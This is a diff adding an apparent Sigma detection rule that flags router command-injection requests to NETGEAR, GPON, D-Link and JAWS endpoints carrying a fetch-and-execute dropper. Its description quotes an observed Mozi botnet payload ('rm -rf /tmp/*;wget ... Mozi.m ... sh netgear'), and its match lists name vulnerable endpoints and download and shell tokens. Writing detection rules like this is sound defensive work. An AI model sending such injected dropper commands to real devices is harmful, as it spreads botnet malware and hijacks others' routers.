@@ -1,0 +1,67 @@
+title: Router command-injection endpoint carrying a payload fetch
+id: 75e3aca0-ec18-48a6-80e0-4c30d0aa7bc9
+status: experimental
+description: |
+  A NETGEAR / GPON / D-Link / JAWS command-injection endpoint where the
+  injected parameter is not a probe value but a working dropper: clear the
+  temp directory, fetch a binary over HTTP, make it executable, run it.
+  This is the difference between the spray and the payload. The spray rule
+  matches '/setup.cgi' and stays at `low` because the internet is full of it.
+  This one requires the shell command to be in the request, so what it reports
+  is the URL the botnet is serving from and the name of the file it drops -
+  both of which are indicators, not noise.
+  On the host this was written against, eighty of these arrived carrying
+  'rm -rf /tmp/*;wget http://<host>:<port>/Mozi.m -O /tmp/netgear;sh netgear'
+  from a different source address each time - Mozi propagating, with each
+  infected peer serving the next.
+author: linsight
+date: 2026-08-26
+logsource:
+  product: linux
+  category: webserver
+detection:
+  endpoint:
+    resource|contains:
+      - '/setup.cgi'
+      - 'todo=syscmd'
+      - 'GponForm/diag_Form'
+      - 'dest_host='
+      - '/HNAP1'
+      - '/shell\?'
+      - 'currentsetting.htm'
+      - '/board.cgi'
+      - '/cgi-bin/mainfunction.cgi'
+  fetch:
+    resource|contains:
+      - 'wget'
+      - 'curl'
+      - 'tftp'
+      - 'ftpget'
+      - 'busybox'
+  run:
+    resource|contains:
+      - ';sh'
+      - '+sh+'
+      - '|sh'
+      - 'chmod'
+      - ';./'
+      - '%3bsh'
+      - 'bin/busybox'
+  condition: endpoint and fetch and run
+fields:
+  - client_ip
+  - method
+  - resource
+  - status
+  - user_agent
+falsepositives:
+  - None. A router configuration endpoint does not take a download-and-execute
+    line as a parameter value for any legitimate reason.
+level: high
+tags:
+  - attack.initial_access
+  - attack.t1190
+  - attack.execution
+  - attack.t1059.004
+  - attack.command_and_control
+  - attack.t1105
